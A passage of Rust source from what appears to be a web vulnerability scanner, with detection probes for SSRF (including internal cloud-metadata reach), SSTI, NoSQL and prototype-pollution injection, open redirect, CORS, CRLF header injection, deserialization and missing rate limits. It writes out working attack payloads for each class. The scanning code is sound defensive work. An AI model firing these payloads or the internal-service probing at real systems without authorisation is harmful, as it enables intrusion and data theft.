            if (300..400).contains(&r.status)
                && r.location
                    .as_deref()
                    .map(|l| l.contains(&host))
                    .unwrap_or(false)
            {
                redirected_to_listener = true;
            }
        }
    }
    if redirected_to_listener {
        // The endpoint pointed a browser at our listener rather than fetching
        // it. That is an open redirect, which probe_open_redirect reports, and
        // it is not SSRF. Nothing is parked, so a callback arriving from a
        // browser following that redirect cannot be read as a fetch.
        return None;
    }
    // Park it. One poll at the end of the pass decides whether the server
    // actually fetched our listener.
    if let Ok(mut v) = q.lock() {
        v.push(PendingOob {
            marker,
            finding: finding(
                "ssrf",
                "Server-side request forgery (blind, OAST-confirmed)",
                "high",
                site,
                format!(
                    "A URL pointing at our out-of-band listener, supplied in the {}, was fetched by the server: it makes outbound requests to attacker-controlled destinations (SSRF), which can reach internal-only services and cloud metadata endpoints.",
                    site.where_label()
                ),
            ),
        });
    }
    None
}

/// SSRF confirmed by reading the fetch back, then followed where it leads.
///
/// Costs nothing on a parameter that is not an SSRF: the canary fetch and one
/// payload, and it stops there unless the target's own page comes back through
/// the parameter.
async fn probe_ssrf_reflected(
    client: &Client,
    site: &Site,
    chain_targets: &[crate::chain::InternalTarget],
) -> Option<Value> {
    // A page of the target, fetched by us, so we know what it says before we
    // ask the server to say it.
    let root = origin_of(&site.url)?;
    // One fetch of the canary page per host, not one per candidate parameter.
    let candidates = match crate::ssrf::cached_canary(&root) {
        Some(c) => c,
        None => {
            let canary = probe::send(client, "GET", &root, None).await?;
            crate::ssrf::canary_tokens_for(&root, &canary.body)
        }
    };
    if candidates.is_empty() {
        trace_ssrf(site, "no distinctive text on the site root to look for");
        return None;
    }

    // A candidate that already appears in the endpoint's ordinary answer proves
    // nothing: site-wide chrome is on both pages whether or not anything was
    // fetched. Take the first candidate that is not.
    let base = send_site(client, site, &site.base_value).await?;
    let Some(token) = candidates.iter().find(|t| !base.body.contains(*t)).cloned() else {
        trace_ssrf(
            site,
            "every candidate token already appears in the ordinary answer",
        );
        return None;
    };

    let hit = send_site(client, site, &root).await?;
    if !hit.body.contains(&token) {
        trace_ssrf(
            site,
            &format!(
                "asked it to fetch {root} and the answer did not carry `{token}` (got {} bytes)",
                hit.body.len()
            ),
        );
        return None;
    }

    // Control: the same parameter pointed somewhere nothing can answer. An
    // endpoint that echoes a whole response body whatever you give it would
    // otherwise read as SSRF.
    let ctrl = send_site(client, site, crate::ssrf::CLOSED_INTERNAL).await?;
    if ctrl.body.contains(&token) {
        trace_ssrf(
            site,
            "a closed port produced the token too, so it echoes rather than fetches",
        );
        return None;
    }

    // Confirmed. Now one request per internal address, once per host, with a
    // short deadline - see `ssrf::INTERNAL_TIMEOUT`.
    let host = host_of(&site.url);
    let mut reached = crate::ssrf::cached_internal(&host).unwrap_or_default();
    let mut worst = if reached.is_empty() {
        "high"
    } else {
        "critical"
    };
    if crate::ssrf::cached_internal(&host).is_none() {
        for svc in crate::ssrf::INTERNAL {
            let headers: Vec<(String, String)> = svc
                .headers
                .iter()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect();
            let (url, body) = site.render(svc.url);
            let sent = tokio::time::timeout(
                crate::ssrf::INTERNAL_TIMEOUT,
                probe::send_with(
                    client,
                    &site.method,
                    &url,
                    body.as_ref().map(|(b, c)| (b.as_str(), *c)),
                    &headers,
                ),
            )
            .await;
            let Ok(Some(r)) = sent else {
                continue;
            };
            if crate::ssrf::identify(&r.body).is_some() {
                reached.push(crate::ssrf::reach_note(svc));
                worst = "critical";
            }
        }
        crate::ssrf::remember_internal(&host, &reached);
    }

    // The chain. Addresses another engine observed on this estate, each one
    // re-tested through the SSRF just confirmed above. `ctrl` is control A: what
    // this application says when a fetch cannot connect.
    let mut chained: Vec<Value> = Vec::new();
    // Control B is a property of the HOST, not of the port we were told about,
    // so it is taken once per host however many addresses on it were observed.
    let mut control_b: std::collections::HashMap<String, String> = std::collections::HashMap::new();
    for t in chain_targets.iter().take(crate::chain::MAX_TARGETS) {
        let cb = match control_b.get(&t.host) {
            Some(b) => b.clone(),
            None => {
                let Some(r) = fetch_through(client, site, &t.control_url()).await else {
                    continue;
                };
                control_b.insert(t.host.clone(), r.body.clone());
                r.body
            }
        };
        let Some(hit) = fetch_through(client, site, &t.url()).await else {
            continue;
        };
        if !crate::chain::answered(&hit.body, &ctrl.body, &cb) {
            continue;
        }
        chained.push(crate::chain::reached_note(
            t,
            crate::chain::banner_echo(&t.banner, &hit.body),
        ));
    }
    if !chained.is_empty() {
        worst = "critical";
    }

    let where_to = if reached.is_empty() {
        "No cloud metadata service answered, so this instance is either not in one or is running \
         IMDSv2, which requires a token this probe deliberately does not try to obtain. The bug is \
         the same; only the shortest path off it is missing."
            .to_string()
    } else {
        format!(
            "It reaches {}, which is the escalation: those services answer any request from inside \
             the instance and hand out the role credentials the instance runs as. This probe asked \
             each one for its INDEX and stopped there - it did not fetch a credential, and a \
             scanner holding somebody's live cloud session keys would be a worse problem than the \
             one it found.",
            reached
                .iter()
                .filter_map(|v| v.get("service").and_then(|s| s.as_str()))
                .collect::<Vec<_>>()
                .join(", ")
        )
    };
    // The chain, stated as what was demonstrated rather than what it implies.
    let chain_line = if chained.is_empty() {
        String::new()
    } else {
        format!(
            " Through this same parameter it also reached {}, each confirmed by asking for it and \
             then asking for a closed port on the SAME host: the service answered and the closed \
             port produced this application's ordinary fetch failure, so the difference is the \
             service and not the network. These addresses were not guessed from the finding list - \
             another engine observed them on this estate, they are inside the scope you authorised, \
             and each one was re-tested through this bug before it was named.",
            chained
                .iter()
                .map(|v| {
                    let h = v.get("host").and_then(|x| x.as_str()).unwrap_or("?");
                    let p = v.get("port").and_then(|x| x.as_u64()).unwrap_or(0);
                    match v.get("service").and_then(|x| x.as_str()) {
                        Some(svc) => format!("{h}:{p} ({svc})"),
                        None => format!("{h}:{p}"),
                    }
                })
                .collect::<Vec<_>>()
                .join(", ")
        )
    };

    let mut f = Finding::new(
        "cortex-ssrf",
        "ssrf",
        "Server-side request forgery (response returned to the caller)",
        worst,
        &site.url,
    )
    .method(&site.method)
    .param(&site.param)
    .location(&site.where_label())
    .describe(format!(
        "A URL supplied in the {} was fetched by the server and its body returned in the \
         response: text from a different page of this application came back through `{}`, while \
         the same parameter pointed at a closed port did not. The server makes requests on demand \
         and shows the answers, so every address reachable from it is reachable from outside - \
         loopback services with no authentication because \"only the app can reach them\", \
         internal admin panels, and the private ranges. Unlike the out-of-band case, this one \
         needs no route to the internet, so a firewalled deployment does not mitigate it. {}{}",
        site.where_label(),
        site.param,
        where_to,
        chain_line
    ))
    .with("internal_reach", json!(reached));
    if !chained.is_empty() {
        f = f.with("reached_internal_services", json!(chained));
    }
    if !reached.is_empty() || !chained.is_empty() {
        f = f.with("chained", json!(true));
    }
    Some(f.build())
}

/// `http://host:port/` for a URL, which is the page the canary comes from.
fn origin_of(url: &str) -> Option<String> {
    let (scheme, rest) = url.split_once("://")?;
    let host = rest.split('/').next()?;
    (!host.is_empty()).then(|| format!("{scheme}://{host}/"))
}

// ---------------------------------------------------------------- resource consumption (API4)
/// Sensitive endpoints where a missing rate limit is directly exploitable (credential stuffing,
/// OTP/2FA brute-force, password-reset abuse, signup flooding). Scoped to these to stay high-signal
/// rather than flagging every read endpoint that happens not to throttle.
static SENSITIVE_PATH: &[&str] = &[
    "login", "signin", "sign-in", "auth", "token", "otp", "mfa", "2fa", "twofa", "verify",
    "password", "passwd", "reset", "forgot", "register", "signup", "sign-up", "recover",
];

/// Missing rate limiting on a sensitive flow (OWASP API4). Fire a short burst of the baseline
/// request; if none are throttled (429 / 503 / Retry-After) the endpoint accepts unlimited attempts.
/// Deduped per (method, path) so a burst runs once, not per param.
async fn probe_ratelimit(client: &Client, ep: &InjEndpoint, seen: &SeenSet) -> Option<Value> {
    let path_l = ep.url.to_lowercase();
    if !SENSITIVE_PATH.iter().any(|k| path_l.contains(k)) {
        return None;
    }
    let key = format!("{} {}", ep.method.to_uppercase(), ep.url);
    if !seen_once(seen, key) {
        return None;
    }
    let method = ep.method.to_uppercase();
    // Build a representative body for write methods so the request is realistic.
    let body_owned: Option<(String, &'static str)> =
        if matches!(method.as_str(), "POST" | "PUT" | "PATCH") && !ep.body.is_empty() {
            let mut obj = serde_json::Map::new();
            for f in &ep.body {
                obj.insert(f.name.clone(), json_typed(&f.value, f.ty.as_deref()));
            }
            Some((Value::Object(obj).to_string(), "application/json"))
        } else {
            None
        };
    const BURST: usize = 20;
    let mut throttled = 0u32;
    let mut ok = 0u32;
    for _ in 0..BURST {
        let body_ref = body_owned.as_ref().map(|(b, ct)| (b.as_str(), *ct));
        match probe::send(client, &method, &ep.url, body_ref).await {
            Some(r) if r.status == 429 || r.status == 503 => throttled += 1,
            Some(_) => ok += 1,
            None => {}
        }
    }
    // Only flag when the burst clearly went through unthrottled (avoid a target that was simply down).
    if throttled == 0 && ok >= (BURST as u32 * 3 / 4) {
        return Some(
            Finding::new(
                "cortex-inject",
                "no_rate_limit",
                "Missing rate limiting on a sensitive endpoint",
                "medium",
                &ep.url,
            )
            .method(&method)
            .location("endpoint")
            .describe(format!(
                "{BURST} requests were sent in quick succession to this authentication/account endpoint and none were throttled (no 429 / Retry-After). Without rate limiting it is open to credential stuffing, OTP/2FA brute-force, and password-reset or signup flooding (OWASP API4: Unrestricted Resource Consumption)."
            ))
            .build(),
        );
    }
    None
}

// ---------------------------------------------------------------- improper inventory (API9)
/// A version token in a path: `/v1/`, `/v2/`, `/api/v3/...`. Captures the numeric version.
static VERSION_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)/v(\d+)(?:/|$)").unwrap());

/// Shadow / retired API versions (OWASP API9). Given a versioned operation `/api/v2/users`, probe
/// the sibling versions (`v1`, `v3`, ...); any that still answer as a real route (not 404 / not a
/// transport error) is an undocumented or un-retired version - a common source of "the old endpoint
/// skipped the new auth check". Deduped per (method, version-family) so it fires once, not per param.
async fn probe_inventory(client: &Client, ep: &InjEndpoint, seen: &SeenSet) -> Vec<Value> {
    let mut out = Vec::new();
    let url = ep.url.clone();
    let Some(m) = VERSION_RE.captures(&url) else {
        return out;
    };
    let cur: u32 = m.get(1).and_then(|g| g.as_str().parse().ok()).unwrap_or(0);
    let whole = m.get(0).unwrap().as_str().to_string(); // e.g. "/v2/" or "/v2"
    // family key = method + path with the version blanked, so /v1/x and /v2/x share one probe.
    let family = format!(
        "{} {}",
        ep.method.to_uppercase(),
        url.replacen(&whole, "/v#/", 1)
    );
    if !seen_once(seen, family) {
        return out;
    }
    let method = ep.method.to_uppercase();
    // Probe versions 1..=cur+2 (skip the current one). Cap the span so a huge version number
    // does not explode the request count.
    let lo = 1u32;
    let hi = cur.saturating_add(2).min(lo + 8);
    for v in lo..=hi {
        if v == cur {
            continue;
        }
        let sib_seg = whole.replace(&format!("v{cur}"), &format!("v{v}"));
        let sib_url = url.replacen(&whole, &sib_seg, 1);
        let Some(resp) = probe::send(client, &method, &sib_url, None).await else {
            continue;
        };
        // 404 / 410 = the version genuinely does not exist. Anything else (200/2xx, 401/403 auth,
        // 405 method, 5xx app error) means the route is wired up -> a live sibling version.
        if resp.status != 404 && resp.status != 410 && resp.status != 0 {
            out.push(
                Finding::new(
                    "cortex-inject",
                    "improper_inventory",
                    "Undocumented / shadow API version",
                    "medium",
                    &sib_url,
                )
                .method(&method)
                .location("path")
                .describe(format!(
                    "The operation is versioned `v{cur}`, but sibling version `v{v}` at this path still answers (HTTP {}) instead of 404. Undocumented or un-retired versions frequently miss the auth, validation, or rate-limit fixes applied to the current version (OWASP API9: Improper Inventory Management).",
                    resp.status
                ))
                .build(),
            );
        }
    }
    out
}

// ---------------------------------------------------------------- reflected XSS
// ---------------------------------------------------------------- open redirect
static REDIRECT_HINT: &[&str] = &[
    "redirect",
    "redirect_uri",
    "redirecturl",
    "redir",
    "url",
    "next",
    "return",
    "returnurl",
    "return_url",
    "returnto",
    "goto",
    "dest",
    "destination",
    "continue",
    "target",
    "callback",
    "forward",
    "to",
    "u",
    "r",
    "link",
    "out",
    "view",
    "page",
    "checkout_url",
    "success_url",
    "cancel_url",
    "back",
    "backurl",
    "origin",
    "path",
];
const REDIR_MARKER_HOST: &str = "cfx-redir.example";

/// Open redirect: a redirect-target param reflected into the `Location` of a 3xx pointing at an
/// attacker host. Needs the NO-REDIRECT client so we see the 3xx + Location instead of the followed
/// page. Scoped to redirect-looking params (or values that already look like a URL) to stay quiet.
async fn probe_open_redirect(client_nr: &Client, site: &Site) -> Option<Value> {
    if !matches!(site.loc, Loc::Query | Loc::BodyForm | Loc::BodyJson) {
        return None;
    }
    let name = site.param.to_lowercase();
    let hinted = hint_matches(&name, REDIRECT_HINT) || looks_like_url(&site.base_value);
    if !hinted {
        return None;
    }
    for payload in [
        format!("https://{REDIR_MARKER_HOST}/"),
        format!("//{REDIR_MARKER_HOST}/"),
        format!("https:/{REDIR_MARKER_HOST}/"),
        format!("/\\{REDIR_MARKER_HOST}/"),
    ] {
        let hit = |r: &Option<Resp>| {
            r.as_ref()
                .filter(|x| (300..400).contains(&x.status))
                .and_then(|x| x.location.as_deref())
                .and_then(redirect_host)
                .map(|h| h == REDIR_MARKER_HOST)
                .unwrap_or(false)
        };
        let r = send_site(client_nr, site, &payload).await;
        if hit(&r) {
            let again = send_site(client_nr, site, &payload).await;
            if hit(&again) {
                return Some(finding(
                    "open_redirect",
                    "Open redirect",
                    "medium",
                    site,
                    format!(
                        "A URL supplied in the {} was reflected into the `Location` header (a 3xx redirect to {REDIR_MARKER_HOST}), so the endpoint sends users to attacker-controlled destinations -- usable for phishing and for laundering OAuth/token flows.",
                        site.where_label()
                    ),
                ));
            }
        }
    }
    None
}

/// Destination host of a `Location` value, tolerating scheme-relative (`//h`), backslash (`/\h`),
/// and userinfo (`user@h`) tricks browsers still honour.
fn redirect_host(loc: &str) -> Option<String> {
    let s = loc.trim();
    let rest = s
        .strip_prefix("https://")
        .or_else(|| s.strip_prefix("http://"))
        .or_else(|| s.strip_prefix("//"))
        .or_else(|| s.strip_prefix("/\\"))
        .or_else(|| s.strip_prefix("\\\\"))?;
    let host = rest.split(['/', '?', '#', '\\']).next().unwrap_or("");
    let host = host.rsplit('@').next().unwrap_or(host); // strip userinfo
    let host = host.split(':').next().unwrap_or(host); // strip port
    (!host.is_empty()).then(|| host.to_lowercase())
}

// ---------------------------------------------------------------- SSTI
/// Server-side template injection: an arithmetic template expression that evaluates server-side.
/// Sandwiched in unique markers so the evaluated `49` cannot be a coincidental substring. Covers
/// Jinja2/Twig `{{ }}`, Freemarker / JSP-EL `${ }`, Ruby `#{ }`, ERB `<%= %>`, and Smarty `{ }`.
async fn probe_ssti(client: &Client, site: &Site) -> Option<Value> {
    let a = format!("cfxA{}", site.param.len() + 3);
    let b = format!("B{}cfx", site.url.len() % 97);
    let want = format!("{a}49{b}");
    let payloads = [
        format!("{a}{{{{7*7}}}}{b}"),
        format!("{a}${{7*7}}{b}"),
        format!("{a}#{{7*7}}{b}"),
        format!("{a}<%= 7*7 %>{b}"),
        format!("{a}{{7*7}}{b}"),
    ];
    for p in &payloads {
        // A payload whose request failed is one payload lost, not the whole
        // class. `?` here abandoned every remaining payload the moment one
        // request timed out, which is common the instant anything else on the
        // scan is issuing time-based probes.
        let Some(r) = send_site(client, site, p).await else {
            continue;
        };
        if r.body.contains(&want) {
            let Some(again) = send_site(client, site, p).await else {
                continue;
            };
            if again.body.contains(&want) {
                return Some(finding(
                    "ssti",
                    "Server-side template injection",
                    "high",
                    site,
                    format!(
                        "A template expression injected into the {} was evaluated server-side (`7*7` rendered as `49` between our markers) -- server-side template injection, frequently escalatable to remote code execution.",
                        site.where_label()
                    ),
                ));
            }
        }
    }
    None
}

// ---------------------------------------------------------------- NoSQL injection
/// NoSQL operator injection on a JSON body field: replace the value with a MongoDB-style operator
/// object and look for a result-set change (a match-everything `$gt:""` vs a match-nothing high
/// sentinel). Confirmed by a reproducible boolean differential, so it does not fire on a field the
/// server simply ignores. JSON bodies only (that is where operator objects are interpreted).
/// A numeric input whose computed result has no floor.
///
/// See `tamper` for why the link is proved before it is tested. Costs nothing on
/// a parameter that is not numeric, and two requests on one that is but computes
/// nothing.
async fn probe_tampering(client: &Client, site: &Site, baseline: &Resp) -> Option<Value> {
    let v1 = numeric_base(site)?;
    // A second in-domain value. Doubling keeps it obviously legitimate: an
    // application asked for two of something instead of one has been asked a
    // question it expects.
    let v2 = if v1 == 0.0 { 2.0 } else { v1 * 2.0 };

    let a = crate::tamper::read(&baseline.body);
    let second = send_site(client, site, &fmt_num(v2)).await?;
    let b = crate::tamper::read(&second.body);
    let link = crate::tamper::find_link(&a, &b, v1, v2)?;
    let at_v1 = a.numbers[link.index];

    // The link has to be deterministic before anything is concluded from it.
    // Asking the same question twice and getting the same number is what
    // separates a computed total from a counter that happened to move.
    let again = send_site(client, site, &fmt_num(v1)).await?;
    let c = crate::tamper::read(&again.body);
    if c.skeleton != a.skeleton || c.numbers.len() != a.numbers.len() {
        return None;
    }
    if !crate::tamper::close(c.numbers[link.index], at_v1) {
        return None;
    }

    for (name, bad) in crate::tamper::out_of_domain(v1) {
        let Some(r) = send_site(client, site, &fmt_num(bad)).await else {
            continue;
        };
        // Refused is correct behaviour, and an error page is a refusal.
        if r.status >= 400 {
            continue;
        }
        let d = crate::tamper::read(&r.body);
        if d.skeleton != a.skeleton || d.numbers.len() != a.numbers.len() {
            continue;
        }
        let got = d.numbers[link.index];
        if !crate::tamper::followed_out(link.how, at_v1, v1, bad, got) {
            continue;
        }
        return Some(
            Finding::new(
                "cortex-tamper",
                "tampering",
                "Business logic: a computed value follows an out-of-domain input",
                "high",
                &site.url,
            )
            .method(&site.method)
            .param(&site.param)
            .location(&site.where_label())
            .describe(format!(
                "`{}` is used in an arithmetic whose result the application then returns. Sending \
                 {} instead of {} moved a value in the response from {} to {}, the original value \
                 came back when the original input was re-sent, and then a {name} input ({}) \
                 produced {} - a result the application accepted with {}. The field is not the \
                 bug; the missing bound on what is done with it is. An attacker picks the number, \
                 so they pick the total, the credit or the quantity reserved. Enforce the domain \
                 where the arithmetic happens, server-side, and reject rather than clamp so the \
                 attempt is visible.",
                site.param,
                fmt_num(v2),
                fmt_num(v1),
                fmt_num(at_v1),
                fmt_num(b.numbers[link.index]),
                fmt_num(bad),
                fmt_num(got),
                r.status
            ))
            .with("input_baseline", json!(v1))
            .with("input_sent", json!(bad))
            .with("computed_baseline", json!(at_v1))
            .with("computed_result", json!(got))
            .with(
                "relation",
                json!(match link.how {
                    crate::tamper::Link::Scale => "scales with the input",
                    crate::tamper::Link::Offset => "offsets with the input",
                }),
            )
            .build(),
        );
    }
    None
}

/// Why the reflected SSRF oracle declined, when `CORTEX_TRACE_SSRF` is set.
///
/// This oracle has four ways to say no and they mean completely different
/// things: nothing distinctive on the site root, a token that was already in
/// the baseline, a fetch that did not come back, and an endpoint that echoes
/// whatever it is handed. Debugging it without knowing which one fired means
/// re-deriving the whole chain by hand, which is an afternoon.
fn trace_ssrf(site: &Site, why: &str) {
    if std::env::var("CORTEX_TRACE_SSRF").is_ok() {
        eprintln!("cortex: ssrf declined {} `{}`: {why}", site.url, site.param);
    }
}

/// Ask the application to fetch one URL and hand back what it got.
///
/// The same request the SSRF oracle just proved works, pointed somewhere else.
/// Bounded by the same short deadline as the metadata walk: an address that does
/// not answer promptly is not worth a scan's time, and a long wait here is
/// usually the network dropping packets rather than a service thinking.
async fn fetch_through(client: &Client, site: &Site, url: &str) -> Option<Resp> {
    let (u, body) = site.render(url);
    tokio::time::timeout(
        crate::chain::CHAIN_TIMEOUT,
        probe::send(
            client,
            &site.method,
            &u,
            body.as_ref().map(|(b, c)| (b.as_str(), *c)),
        ),
    )
    .await
    .ok()
    .flatten()
}

/// The site's own value as a number, when the field is numeric.
///
/// Either it parses, or a spec declared it `integer`/`number` and the value is
/// a placeholder. A field that is not numeric has no arithmetic to abuse.
fn numeric_base(site: &Site) -> Option<f64> {
    if let Ok(n) = site.base_value.trim().parse::<f64>() {
        return n.is_finite().then_some(n);
    }
    let declared = site
        .body
        .iter()
        .find(|(k, _, _)| k == &site.param)
        .and_then(|(_, _, ty)| ty.as_deref())?;
    matches!(declared, "integer" | "number").then_some(1.0)
}

/// Render a number the way a form or a JSON body would carry it: no trailing
/// `.0` on a whole number, because `quantity=2.0` is a different request from
/// `quantity=2` to plenty of validators.
fn fmt_num(v: f64) -> String {
    if v.fract() == 0.0 && v.abs() < 1e15 {
        format!("{}", v as i64)
    } else {
        format!("{v}")
    }
}

/// Unsafe deserialization of a request parameter.
///
/// One request asks the question; a second one answers it. See `deserial` for
/// why this is an error-differential check rather than a gadget chain, and why
/// that is not a compromise.
async fn probe_deserialization(client: &Client, site: &Site) -> Option<Value> {
    let probe = send_site(client, site, crate::deserial::PROBE_VALUE).await?;
    let format = crate::deserial::accused(&probe.body)?;

    // A second invalid value, unlike the first. The parser has to complain
    // about both before "it stopped complaining" means anything: an endpoint
    // running a deserializer over something else entirely, which happened to
    // fall quiet on the one valid blob we sent, would otherwise read as a
    // finding.
    let alt = send_site(client, site, crate::deserial::PROBE_VALUE_ALT).await?;
    if !crate::deserial::still_complaining(format, &alt.body) {
        return None;
    }

    // The complaint alone would be a guess: some pages carry a parser's name in
    // a stack trace for reasons of their own, and only the baseline was checked
    // so far. Hand the deserializer something it CAN read, and if it stops
    // complaining then it really was reading our bytes.
    let mut candidates: Vec<(&str, &str)> = vec![("base64-encoded", format.valid_b64)];
    // The raw form only when the blob happens to be text. Java's and .NET's
    // headers are not, and pushing them through a String would send a different
    // sequence of bytes than the one the table describes - a probe that cannot
    // say what it sent is not a probe.
    if let Ok(raw) = std::str::from_utf8(format.valid_raw) {
        candidates.push(("raw", raw));
    }
    let mut confirmed_as = None;
    for (how, candidate) in candidates {
        let Some(r) = send_site(client, site, candidate).await else {
            continue;
        };
        if !crate::deserial::still_complaining(format, &r.body) {
            confirmed_as = Some(how);
            break;
        }
    }
    let how = confirmed_as?;

    Some(
        Finding::new(
            "cortex-deserial",
            "deserialization",
            format!("Unsafe deserialization ({})", format.label),
            "critical",
            &site.url,
        )
        .method(&site.method)
        .param(&site.param)
        .location(&site.where_label())
        .describe(format!(
            "`{}` is passed to {} without being checked first. A value that is not a serialized \
             object made the deserializer itself complain in the response - text this scan never \
             sent - a second, differently shaped invalid value made it complain again, and a \
             minimal valid {how} object made the complaint stop. That is what shows the \
             application is parsing THESE bytes, rather than echoing a stack trace it always \
             shows or running a deserializer over something else. From here an attacker supplies an object graph instead of a value, and \
             the damage is decided by which classes the application's dependencies happen to \
             provide: at worst, code execution before any of your own logic runs. No gadget chain \
             was attempted and none is needed to fix it - deserializing untrusted input is the \
             bug. Carry the value in a format that describes data rather than objects (JSON with a \
             schema), or sign the blob and reject anything unsigned.",
            site.param, format.label
        ))
        .with("format", json!(format.name))
        .with("transport", json!(how))
        .build(),
    )
}

/// Server-side prototype pollution.
///
/// A JSON body carrying `__proto__` can write onto `Object.prototype` in a Node
/// application that merges request data into an object without guarding the
/// key. Every object created afterwards inherits what was written, which is how
/// it becomes privilege escalation, authentication bypass or remote code
/// execution, depending on what the application reads next.
///
/// OPT-IN, and never part of the default sweep. Every other probe here is
/// read-only: it sends a payload, reads the answer, and leaves the target as it
/// found it. This one does not. Polluting `Object.prototype` changes the
/// behaviour of the whole process for as long as it lives, and nothing outside
/// the process can undo it. Doing that to someone's service without being asked
/// would be indefensible, so it fires only when the caller names the class.
///
/// The oracle is a property that has no reason to exist. Write a random key
/// onto the prototype, then make an ordinary request and look for that key in
/// the answer. An application that hands back an object carrying a key we
/// invented is an application whose prototype we just wrote to. There is no
/// benign reading of that, which is what makes it confirmable without a
/// destructive payload.
async fn probe_proto_pollution(client: &Client, site: &Site, baseline: &Resp) -> Option<Value> {
    if site.loc != Loc::BodyJson {
        return None;
    }
    // A key no application has: if it comes back, we put it there.
    let marker = format!(
        "cfxpp{:x}{:x}",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.subsec_nanos())
            .unwrap_or(0),
        site.url.len()
    );
    if baseline.body.contains(&marker) {
        return None;
    }

    // Both spellings. `__proto__` is the direct route; `constructor.prototype`
    // reaches the same object by a path that key-name filters routinely miss.
    for shape in [
        json!({ "__proto__": { marker.clone(): marker.clone() } }),
        json!({ "constructor": { "prototype": { marker.clone(): marker.clone() } } }),
    ] {
        // Top level, beside the real fields - not as the value of one of them.
        let Some(extra) = shape.as_object() else {
            continue;
        };
        let Some((body, ctype)) = site.render_body_json_with(extra) else {
            continue;
        };
        let _ = send(
            client,
            &site.method,
            &site.url,
            Some((body.as_str(), ctype)),
        )
        .await;

        // Now ask an ordinary question. If the answer carries our key, the
        // prototype every object inherits from is carrying it too.
        let after = send_site(client, site, &site.base_value).await;
        if !after
            .as_ref()
            .map(|r| r.body.contains(&marker))
            .unwrap_or(false)
        {
            continue;
        }
        let again = send_site(client, site, &site.base_value).await;
        if again.map(|r| r.body.contains(&marker)).unwrap_or(false) {
            return Some(finding(
                "proto_pollution",
                "Server-side prototype pollution",
                "high",
                site,
                format!(
                    "A key invented for this test was written through the {} onto the object \
                     prototype, and a later ordinary request came back carrying it. The \
                     application merges request data into an object without rejecting \
                     `__proto__` / `constructor.prototype`, so every object built afterwards \
                     inherits whatever an attacker writes. Depending on what the application \
                     reads next, that is authentication bypass, privilege escalation or remote \
                     code execution. Note: this test leaves the property set, and the process \
                     must be restarted to clear it.",
                    site.where_label()
                ),
            ));
        }
    }
    None
}

async fn probe_nosql(client: &Client, site: &Site, baseline: &Resp) -> Option<Value> {
    if site.loc != Loc::BodyJson {
        return None;
    }
    let hi = "\u{ffff}\u{ffff}\u{ffff}"; // sorts after almost any real value
    let t_op = json!({ "$gt": "" });
    let f_op = json!({ "$gt": hi });
    let send_op = |raw: Value| async move {
        let (body, ctype) = site.render_body_json_raw(&raw)?;
        send(
            client,
            &site.method,
            &site.url,
            Some((body.as_str(), ctype)),
        )
        .await
    };
    let a = send_op(t_op.clone()).await;
    let b = send_op(f_op.clone()).await;
    if let (Some(a), Some(b)) = (a, b) {
        if boolean_differential(baseline, &a, &b, 32) {
            let a2 = send_op(t_op).await;
            let b2 = send_op(f_op).await;
            if let (Some(a2), Some(b2)) = (a2, b2) {
                if boolean_differential(baseline, &a2, &b2, 32) {
                    return Some(finding(
                        "nosqli",
                        "NoSQL injection (operator injection)",
                        "high",
                        site,
                        format!(
                            "A MongoDB-style operator object injected into the JSON {} changed the result set (a match-all `$gt` vs a match-none sentinel), so the value is used unsanitised in a NoSQL query -- an authentication/authorization bypass or data-exfiltration vector.",
                            site.where_label()
                        ),
                    ));
                }
            }
        }
    }
    None
}

// ---------------------------------------------------------------- CORS misconfiguration
/// A request carrying an attacker `Origin` that the server reflects into `Access-Control-Allow-Origin`
/// while also allowing credentials means any site can read this endpoint's authenticated responses
/// cross-origin. Confirmed by reproducing the reflection. Endpoint-level, deduped per URL.
async fn probe_cors(client: &Client, ep: &InjEndpoint, seen: &SeenSet) -> Option<Value> {
    if !seen_once(seen, ep.url.clone()) {
        return None;
    }
    let method = ep.method.to_uppercase();
    let evil = "https://cfx-cors.example".to_string();
    let hdrs = vec![("Origin".to_string(), evil.clone())];
    let check = |r: &Option<Resp>| -> Option<String> {
        let r = r.as_ref()?;
        let acao = r.header("access-control-allow-origin")?;
        let acac = r
            .header("access-control-allow-credentials")
            .map(|v| v.eq_ignore_ascii_case("true"))
            .unwrap_or(false);
        // Exploitable: attacker origin reflected + credentials allowed, or wildcard + credentials.
        if acac && (acao == evil || acao == "*") {
            Some(acao.to_string())
        } else {
            None
        }
    };
    let r1 = send_with(client, &method, &ep.url, None, &hdrs).await;
    let acao = check(&r1)?;
    let r2 = send_with(client, &method, &ep.url, None, &hdrs).await;
    // Require the reflection to reproduce before reporting (confirm-before-report).
    check(&r2)?;
    Some(
        Finding::new(
            "cortex-inject",
            "cors",
            "CORS misconfiguration (credentialed cross-origin read)",
            "high",
            &ep.url,
        )
        .method(&method)
        .location("header")
        .describe(format!("The endpoint reflects an arbitrary request `Origin` into `Access-Control-Allow-Origin` (`{acao}`) while allowing credentials - so any attacker-controlled site can read this endpoint's authenticated cross-origin responses (account takeover / data theft)."))
        .build(),
    )
}

// ---------------------------------------------------------------- CRLF / header injection
/// A CR/LF injected into a value that the app copies into a response header lets an attacker inject
/// arbitrary headers (session fixation via Set-Cookie, cache poisoning, response splitting). Confirmed
/// by our own header materialising in the response - zero false positives.
async fn probe_crlf(client: &Client, site: &Site) -> Option<Value> {
    // Only URL-ish injection points: query/path/header (a body value is not copied into headers).
    if !matches!(site.loc, Loc::Query | Loc::Path | Loc::Header) {
        return None;
    }
    let marker = format!("cfxhi{}z{}", site.url.len(), site.param.len());
    let base = &site.base_value;
    // Raw CR/LF; set_param percent-encodes it (%0D%0A) on the wire, the app decodes it, and if it
    // writes the value into a header our injected `X-Cfx-Inj` header splits out. Try single and double
    // CRLF (the latter starts a new body, catching stricter parsers).
    // A RAW CR/LF is only worth sending where the application decodes the value
    // itself - a query or path parameter. In a request header it cannot work:
    // the server's own parser splits the header before the application ever
    // sees it, so the value the app copies into the response never contains the
    // CR/LF. reqwest refuses to build such a request at all (correctly - it
    // would be client-side smuggling), which produced 28 unsendable requests
    // per pass, invisible until the engine was made to say why a request
    // failed. Neither the raw sender nor any other client changes that: the
    // payload is unreachable by construction, not by client policy.
    //
    // The encoded form is the one that matters on a header site, and it sends
    // fine: the app decodes `%0d%0a` itself and writes the result into a
    // response header.
    let payloads: Vec<String> = if matches!(site.loc, Loc::Header) {
        vec![format!("{base}%0d%0aX-Cfx-Inj: {marker}")]
    } else {
        vec![
            format!("{base}\r\nX-Cfx-Inj: {marker}"),
